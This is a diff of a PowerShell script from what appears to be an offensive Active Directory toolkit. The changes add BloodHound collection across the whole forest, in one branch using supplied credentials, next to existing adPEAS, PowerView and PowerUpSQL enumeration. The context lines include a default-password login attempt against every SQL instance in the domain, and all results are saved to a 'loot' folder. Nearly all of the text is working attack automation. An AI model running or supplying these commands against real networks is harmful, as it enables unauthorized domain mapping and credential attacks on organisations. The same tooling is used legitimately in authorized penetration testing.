@@ -2,7 +2,9 @@ mkdir C:/blood/loot/AD
 $lets_go_back=$pwd
 cd C:/blood/loot/AD
 if($asme_1029384756) {
-    Invoke-Adpeas -module Domain,CA,Creds,Delegation,Accounts,Computer,Bloodhound -Vulns -scope all -Domain $domain_1029384756 | tee C:/blood/loot/AD/"$domain_1029384756"_adpeas.txt
+    Invoke-Adpeas -module Domain,CA,Creds,Delegation,Accounts,Computer -Vulns -Domain $domain_1029384756 | tee C:/blood/loot/AD/"$domain_1029384756"_adpeas.txt
+    Invoke-BloodHound -Domain $domain_1029384756 -CollectionMethod All -outputdirectory C:/blood/loot/AD/ -SearchForest
+
     echo "STARTING CUSTOM ENUMERATION . . ."
     echo "ENUMERATING AD:" >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
     Get-DomainComputer -Domain $domain_1029384756 | select dnshostname >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
@@ -20,12 +22,14 @@ if($asme_1029384756) {
     Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | ft >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
     echo "TRYING DEFAULT CREDS TO THE ABOVE DATABASES:" >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
     Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw  >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+
 } else {
-    Invoke-Adpeas -module Domain,CA,Creds,Delegation,Accounts,Computer,Bloodhound -Vulns -scope all -Domain $domain_1029384756 -Username $user_1029384756 -Password $pass_1029384756 | tee C:/blood/loot/AD/"$domain_1029384756"_adpeas.txt
+    Invoke-Adpeas -module Domain,CA,Creds,Delegation,Accounts,Computer -Vulns -Domain $domain_1029384756 -Username $user_1029384756 -Password $pass_1029384756 | tee C:/blood/loot/AD/"$domain_1029384756"_adpeas.txt
+    $bloodhound_user=$user_1029384756 -replace '(^.*\\)',''
+    Invoke-BloodHound -Domain $domain_1029384756 -LdapUsername $bloodhound_user -LDAPPass "$pass_1029384756" -CollectionMethod All -outputdirectory C:/blood/loot/AD/ -SearchForest
 
     $SecPassword = ConvertTo-SecureString "$pass_1029384756" -AsPlainText -Force
     $Cred = New-Object System.Management.Automation.PSCredential("$user_1029384756", $SecPassword) 
-
     echo "STARTING CUSTOM ENUMERATION . . ."
     echo "ENUMERATING AD AS $user_1029384756" >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
     Get-DomainComputer -Domain $domain_1029384756 -Credential $Cred | select dnshostname >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
